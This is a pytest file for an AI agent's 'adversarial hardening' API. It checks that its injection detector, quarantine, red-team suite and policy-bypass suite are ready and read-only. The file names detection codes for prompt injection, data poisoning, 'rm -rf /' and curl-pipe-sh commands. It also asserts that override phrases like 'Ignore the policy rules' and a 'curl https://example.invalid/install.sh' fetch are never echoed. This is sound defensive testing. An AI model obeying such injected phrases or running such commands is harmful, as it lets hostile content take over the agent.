from __future__ import annotations

import json
from pathlib import Path

from fastapi.testclient import TestClient

from francis.api.app import create_app


def _write_stage13_closure_receipt(
    data_root: Path,
    *,
    receipt_id: str = "trust_calibration_stage13_closure_test",
) -> None:
    path = data_root / "logs" / "trust_calibration" / "stage13_operator_stage_closure_decisions.jsonl"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "ok": True,
                "kind": "francis.stage13.trust_calibration.stage13_closure_decision_receipt",
                "receipt_id": receipt_id,
                "stage": "Stage 13 / Trust Calibration",
                "source_id": "trust_calibration",
                "target": "stage13_trust_calibration",
                "actor": "test.operator",
                "decision": "close_stage13",
                "completion_review_ready": True,
                "stage13_completion_review_ready": True,
                "stage13_closed_by_receipt": True,
                "ready_count": 7,
                "required_count": 7,
                "blockers": [],
                "marks_runtime_stage_state": False,
                "recorded_ts": 1_800_002_000,
                "governance": {
                    "explicit_operator_decision": True,
                    "stage_closure_decision": True,
                    "completion_review_ready": True,
                    "does_not_mutate_runtime_stage_state": True,
                    "grants_execution_authority": False,
                    "grants_mutation_authority": False,
                },
            },
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )


def test_adversarial_hardening_status_blocks_until_stage13_closure(monkeypatch, tmp_path: Path) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))

    response = TestClient(create_app()).get("/adversarial-hardening/status")

    assert response.status_code == 200
    body = response.json()
    assert body["ok"] is True
    assert body["kind"] == "francis.stage14.adversarial_hardening.status"
    assert body["stage"] == "Stage 14 / Adversarial Hardening"
    assert body["status"] == "awaiting_stage13_ledger_closure"
    assert body["stage13_closed_by_receipt"] is False
    assert body["stage13_latest_closure_receipt_id"] == ""
    assert body["injection_containment_contract_ready"] is False
    assert body["quarantine_model_contract_ready"] is False
    assert body["red_team_suite_ready"] is False
    assert body["policy_bypass_regression_suite_ready"] is False
    assert body["ready_count"] == 0
    assert body["required_count"] == 5
    assert body["governance"]["read_only"] is True
    assert body["governance"]["content_cannot_grant_authority"] is True
    assert body["governance"]["does_not_write_quarantine"] is True
    assert body["governance"]["does_not_run_tools"] is True
    assert body["governance"]["grants_execution_authority"] is False
    assert body["governance"]["grants_mutation_authority"] is False
    assert body["next_smallest_truthful_gap"] == "stage13_ledger_closure"


def test_adversarial_hardening_injection_contract_is_ready_after_stage13_closure(
    monkeypatch,
    tmp_path: Path,
) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))
    _write_stage13_closure_receipt(data_root)

    client = TestClient(create_app())
    contract = client.get("/adversarial-hardening/injection-containment-contract").json()

    assert contract["ok"] is True
    assert contract["kind"] == "francis.stage14.adversarial_hardening.injection_containment_contract"
    assert contract["status"] == "ready"
    assert contract["stage13_closed_by_receipt"] is True
    assert contract["stage13_latest_closure_receipt_id"] == "trust_calibration_stage13_closure_test"
    assert contract["injection_containment_contract_ready"] is True
    assert contract["content_cannot_grant_authority"] is True
    assert contract["hostile_content_is_untrusted_input"] is True
    assert contract["instructions_and_data_are_separated"] is True
    assert contract["input_sanitizer"]["risk_score"] >= 7
    assert "pi_ignore_rules" in contract["input_sanitizer"]["signal_codes"]
    assert "pi_system_prompt" in contract["input_sanitizer"]["signal_codes"]
    assert contract["output_verifier"]["high_risk"] is True
    assert "cmd_rm_rf_root" in contract["output_verifier"]["signal_codes"]
    assert "dex_curl_pipe_sh" in contract["output_verifier"]["signal_codes"]
    assert contract["poisoning_detector"]["suspicious"] is True
    assert "trigger_injection" in contract["poisoning_detector"]["signal_codes"]
    assert "label_flip" in contract["poisoning_detector"]["signal_codes"]
    assert contract["containment_defaults"]["safe_defaults"] is True
    assert contract["containment_defaults"]["dry_run_default"] is True
    assert contract["containment_defaults"]["allow_delete_or_move_default"] is False
    assert contract["governance"]["read_only"] is True
    assert contract["governance"]["does_not_write_memory"] is True
    assert contract["governance"]["does_not_write_quarantine"] is True
    assert contract["governance"]["does_not_run_shell"] is True
    assert contract["governance"]["grants_execution_authority"] is False
    assert contract["governance"]["grants_mutation_authority"] is False
    assert contract["next_smallest_truthful_gap"] == "stage14_quarantine_model_contract"

    status = client.get("/adversarial-hardening/status").json()
    assert status["status"] == "stage14_policy_bypass_regression_suite_ready"
    assert status["stage13_closed_by_receipt"] is True
    assert status["injection_containment_contract_ready"] is True
    assert status["quarantine_model_contract_ready"] is True
    assert status["red_team_suite_ready"] is True
    assert status["policy_bypass_regression_suite_ready"] is True
    assert status["ready_count"] == 5
    assert status["required_count"] == 5
    assert status["routes"]["red_team_regression_suite"] == "/adversarial-hardening/red-team-regression-suite"
    assert status["routes"]["policy_bypass_regression_suite"] == (
        "/adversarial-hardening/policy-bypass-regression-suite"
    )
    assert status["next_smallest_truthful_gap"] == "stage14_completion_review"


def test_adversarial_hardening_quarantine_model_contract_is_read_only_and_approval_bound(
    monkeypatch,
    tmp_path: Path,
) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))
    _write_stage13_closure_receipt(data_root)

    client = TestClient(create_app())
    contract = client.get("/adversarial-hardening/quarantine-model-contract").json()

    assert contract["ok"] is True
    assert contract["kind"] == "francis.stage14.adversarial_hardening.quarantine_model_contract"
    assert contract["status"] == "ready"
    assert contract["stage13_closed_by_receipt"] is True
    assert contract["stage13_latest_closure_receipt_id"] == "trust_calibration_stage13_closure_test"
    assert contract["injection_containment_contract_ready"] is True
    assert contract["quarantine_model_contract_ready"] is True
    assert contract["suspicious_input_becomes_review_item"] is True
    assert contract["blocked_input_held_with_evidence"] is True
    assert contract["destructive_disposition_requires_approval"] is True
    assert "evidence" in contract["review_item_contract"]["required_fields"]
    assert "quarantine_id" in contract["record_contract"]["required_fields"]
    assert "approval_requested" in contract["event_contract"]["required_event_kinds"]
    assert "approval_resolved" in contract["event_contract"]["required_event_kinds"]
    assert contract["decision_contract"]["allowed_actions"] == ["keep", "release", "delete"]
    assert contract["decision_contract"]["delete_requires_exact_approval"] is True
    assert contract["decision_contract"]["delete_marks_record_failed"] is True
    assert contract["destructive_action_guards"]["approval_action"] == "web_learning.quarantine.delete"
    assert contract["destructive_action_guards"]["refreshes_missing_approval"] is True
    assert contract["destructive_action_guards"]["refreshes_mismatched_approval"] is True
    assert "/web_learning/quarantine" in contract["routes"]["read"]
    assert "/web_learning/quarantine/{item_id}/decide" in contract["routes"]["decision"]
    assert "src/francis/api/routes/web_learning.py" in contract["source_contracts"]
    assert contract["governance"]["read_only"] is True
    assert contract["governance"]["does_not_write_quarantine"] is True
    assert contract["governance"]["does_not_write_memory"] is True
    assert contract["governance"]["does_not_run_tools"] is True
    assert contract["governance"]["grants_execution_authority"] is False
    assert contract["governance"]["grants_mutation_authority"] is False
    assert contract["next_smallest_truthful_gap"] == "stage14_red_team_regression_suite"


def test_adversarial_hardening_red_team_regression_suite_replays_bounded_corpus(
    monkeypatch,
    tmp_path: Path,
) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))
    _write_stage13_closure_receipt(data_root)

    client = TestClient(create_app())
    contract = client.get("/adversarial-hardening/red-team-regression-suite").json()

    assert contract["ok"] is True
    assert contract["kind"] == "francis.stage14.adversarial_hardening.red_team_regression_suite"
    assert contract["status"] == "ready"
    assert contract["stage13_closed_by_receipt"] is True
    assert contract["stage13_latest_closure_receipt_id"] == "trust_calibration_stage13_closure_test"
    assert contract["injection_containment_contract_ready"] is True
    assert contract["quarantine_model_contract_ready"] is True
    assert contract["red_team_suite_ready"] is True
    assert contract["capture_mode"] == "bounded_static_adversarial_corpus"
    assert contract["case_count"] == 4
    assert contract["passed_count"] == 4
    assert contract["failed_count"] == 0
    assert contract["payload_handling"]["returns_raw_payloads"] is False
    assert contract["payload_handling"]["returns_raw_model_outputs"] is False
    assert contract["payload_handling"]["returns_only_case_ids_scores_and_signal_codes"] is True
    assert contract["governance"]["read_only"] is True
    assert contract["governance"]["does_not_write_receipts"] is True
    assert contract["governance"]["does_not_write_quarantine"] is True
    assert contract["governance"]["does_not_write_memory"] is True
    assert contract["governance"]["does_not_run_tools"] is True
    assert contract["governance"]["does_not_run_shell"] is True
    assert contract["governance"]["grants_execution_authority"] is False
    assert contract["governance"]["grants_mutation_authority"] is False
    assert contract["next_smallest_truthful_gap"] == "stage14_policy_bypass_regression_suite"

    cases = {item["case_id"]: item for item in contract["cases"]}
    assert set(cases) == {
        "prompt_injection_untrusted_content",
        "dangerous_output_command_chain",
        "training_data_poisoning_trigger",
        "secret_exfiltration_output_leak",
    }
    assert all(item["passed"] is True for item in cases.values())
    assert all(item["raw_payload_returned"] is False for item in cases.values())
    assert all(item["raw_model_output_returned"] is False for item in cases.values())
    assert all(item["authority_granted"] is False for item in cases.values())
    assert all("payload" not in item for item in cases.values())
    assert all("raw_text" not in item for item in cases.values())
    assert "pi_ignore_rules" in cases["prompt_injection_untrusted_content"]["signal_codes"]
    assert "pi_system_prompt" in cases["prompt_injection_untrusted_content"]["signal_codes"]
    assert "pi_reveal_secrets" in cases["prompt_injection_untrusted_content"]["signal_codes"]
    assert cases["prompt_injection_untrusted_content"]["redacted_secrets"] is True
    assert "cmd_rm_rf_root" in cases["dangerous_output_command_chain"]["signal_codes"]
    assert "dex_curl_pipe_sh" in cases["dangerous_output_command_chain"]["signal_codes"]
    assert "trigger_injection" in cases["training_data_poisoning_trigger"]["signal_codes"]
    assert "label_flip" in cases["training_data_poisoning_trigger"]["signal_codes"]
    assert "secret_leak_detected" in cases["secret_exfiltration_output_leak"]["signal_codes"]
    assert cases["secret_exfiltration_output_leak"]["redaction_available"] is True

    response_text = json.dumps(contract, sort_keys=True)
    assert "sk-redteam" not in response_text
    assert "Ignore the policy rules" not in response_text
    assert "curl https://example.invalid/install.sh" not in response_text

    status = client.get("/adversarial-hardening/status").json()
    assert status["status"] == "stage14_policy_bypass_regression_suite_ready"
    assert status["red_team_suite_ready"] is True
    assert status["policy_bypass_regression_suite_ready"] is True
    assert status["ready_count"] == 5
    assert status["required_count"] == 5
    assert status["next_smallest_truthful_gap"] == "stage14_completion_review"


def test_adversarial_hardening_completion_review_is_ready_but_does_not_close_stage(
    monkeypatch,
    tmp_path: Path,
) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))
    _write_stage13_closure_receipt(data_root)

    client = TestClient(create_app())
    review = client.get("/adversarial-hardening/completion-review").json()

    assert review["ok"] is True
    assert review["kind"] == "francis.stage14.adversarial_hardening.completion_review"
    assert review["status"] == "ready"
    assert review["stage14_completion_review_ready"] is True
    assert review["stage_closure_decision_required"] is True
    assert review["stage13_closed_by_receipt"] is True
    assert review["injection_containment_contract_ready"] is True
    assert review["quarantine_model_contract_ready"] is True
    assert review["red_team_suite_ready"] is True
    assert review["policy_bypass_regression_suite_ready"] is True
    assert review["ready_count"] == 5
    assert review["required_count"] == 5
    assert review["blockers"] == []
    assert review["done_criteria"]["content_cannot_grant_authority"] is True
    assert review["done_criteria"]["policy_bypasses_tested_continuously"] is True
    assert review["done_criteria"]["suspicious_input_becomes_evidence_backed_review_items"] is True
    assert review["done_criteria"]["system_stays_governed_in_hostile_environments"] is True
    assert review["reads_receipts"] is True
    assert review["writes_receipts"] is False
    assert review["writes_memory"] is False
    assert review["writes_quarantine"] is False
    assert review["executes_actions"] is False
    assert review["runs_tools"] is False
    assert review["runs_shell"] is False
    assert review["runs_git"] is False
    assert review["launches_browser"] is False
    assert review["captures_screen"] is False
    assert review["grants_execution_authority"] is False
    assert review["grants_mutation_authority"] is False
    assert review["marks_stage_closed"] is False
    assert review["governance"]["completion_review_only"] is True
    assert review["governance"]["stage_closure_decision_required"] is True
    assert review["governance"]["does_not_mark_stage_closed"] is True
    assert review["routes"]["completion_review"] == "/adversarial-hardening/completion-review"
    assert review["next_smallest_truthful_gap"] == "stage14_operator_stage_closure_decision"

    checks = {item["id"]: item for item in review["checks"]}
    assert set(checks) == {
        "stage13_ledger_closure_backstop",
        "injection_containment_contract_ready",
        "quarantine_model_contract_ready",
        "red_team_suite_ready",
        "policy_bypass_regression_suite_ready",
        "all_deliverables_ready",
        "content_cannot_grant_authority",
        "policy_bypasses_tested_continuously",
        "suspicious_input_becomes_evidence_backed_review_item",
        "stage_not_marked_closed_by_review",
    }
    assert all(item["passed"] is True for item in checks.values())


def test_adversarial_hardening_policy_bypass_regression_suite_is_read_only_and_governed(
    monkeypatch,
    tmp_path: Path,
) -> None:
    data_root = tmp_path / "francis_data"
    monkeypatch.setenv("FRANCIS_DATA_DIR", str(data_root))
    _write_stage13_closure_receipt(data_root)

    client = TestClient(create_app())
    contract = client.get("/adversarial-hardening/policy-bypass-regression-suite").json()

    assert contract["ok"] is True
    assert contract["kind"] == "francis.stage14.adversarial_hardening.policy_bypass_regression_suite"
    assert contract["status"] == "ready"
    assert contract["stage13_closed_by_receipt"] is True
    assert contract["injection_containment_contract_ready"] is True
    assert contract["quarantine_model_contract_ready"] is True
    assert contract["red_team_suite_ready"] is True
    assert contract["policy_bypass_regression_suite_ready"] is True
    assert contract["capture_mode"] == "read_only_policy_bypass_contract_regression"
    assert contract["case_count"] == 5
    assert contract["passed_count"] == 5
    assert contract["failed_count"] == 0
    assert contract["policy_invariants"]["content_cannot_grant_authority"] is True
    assert contract["policy_invariants"]["approval_must_match_exact_action"] is True
    assert contract["policy_invariants"]["missing_approval_returns_needs_approval"] is True
    assert contract["policy_invariants"]["mismatched_approval_refreshes_request"] is True
    assert contract["policy_invariants"]["protected_branch_push_blocked_before_approval"] is True
    assert contract["policy_invariants"]["destructive_quarantine_delete_requires_approval"] is True
    assert contract["governed_surfaces"] == [
        "codex.supervised_exec",
        "git.push",
        "web_learning.quarantine.delete",
    ]
    assert contract["payload_handling"]["returns_raw_payloads"] is False
    assert contract["payload_handling"]["returns_raw_model_outputs"] is False
    assert contract["payload_handling"]["returns_only_case_ids_invariants_and_signal_codes"] is True
    assert contract["governance"]["read_only"] is True
    assert contract["governance"]["does_not_write_receipts"] is True
    assert contract["governance"]["does_not_write_quarantine"] is True
    assert contract["governance"]["does_not_write_memory"] is True
    assert contract["governance"]["does_not_run_tools"] is True
    assert contract["governance"]["does_not_run_shell"] is True
    assert contract["governance"]["does_not_run_git"] is True
    assert contract["governance"]["grants_execution_authority"] is False
    assert contract["governance"]["grants_mutation_authority"] is False
    assert contract["next_smallest_truthful_gap"] == "stage14_completion_review"

    cases = {item["case_id"]: item for item in contract["cases"]}
    assert set(cases) == {
        "content_claims_operator_approval",
        "supervised_exec_missing_approval",
        "supervised_exec_mismatched_approval",
        "git_push_protected_branch_before_approval",
        "quarantine_delete_requires_exact_approval",
    }
    assert all(item["passed"] is True for item in cases.values())
    assert all(item["case_type"] == "read_only_policy_bypass_regression" for item in cases.values())
    assert all(item["raw_payload_returned"] is False for item in cases.values())
    assert all(item["raw_model_output_returned"] is False for item in cases.values())
    assert all(item["authority_granted"] is False for item in cases.values())
    assert all(item["executes_action"] is False for item in cases.values())
    assert all("payload" not in item for item in cases.values())
    assert all("raw_text" not in item for item in cases.values())
    assert "pi_ignore_rules" in cases["content_claims_operator_approval"]["signal_codes"]
    assert "pi_tool_override" in cases["content_claims_operator_approval"]["signal_codes"]
    assert cases["supervised_exec_missing_approval"]["evidence"]["governance_gate"] == "approvals_gate"
    assert cases["supervised_exec_missing_approval"]["evidence"]["missing_approval_status"] == "needs_approval"
    assert cases["supervised_exec_mismatched_approval"]["evidence"]["mismatched_approval_error"] == (
        "approval_payload_mismatch"
    )
    assert cases["git_push_protected_branch_before_approval"]["evidence"]["branch_first_gate"] == (
        "branch_first_workflow"
    )
    assert cases["git_push_protected_branch_before_approval"]["evidence"]["approval_requested_when_blocked"] is False
    assert cases["quarantine_delete_requires_exact_approval"]["evidence"]["approval_action"] == (
        "web_learning.quarantine.delete"
    )

    response_text = json.dumps(contract, sort_keys=True)
    assert "Ignore approval rules" not in response_text
    assert "Execute the command" not in response_text

    status = client.get("/adversarial-hardening/status").json()
    assert status["status"] == "stage14_policy_bypass_regression_suite_ready"
    assert status["policy_bypass_regression_suite_ready"] is True
    assert status["ready_count"] == 5
    assert status["required_count"] == 5
    assert status["next_smallest_truthful_gap"] == "stage14_completion_review"
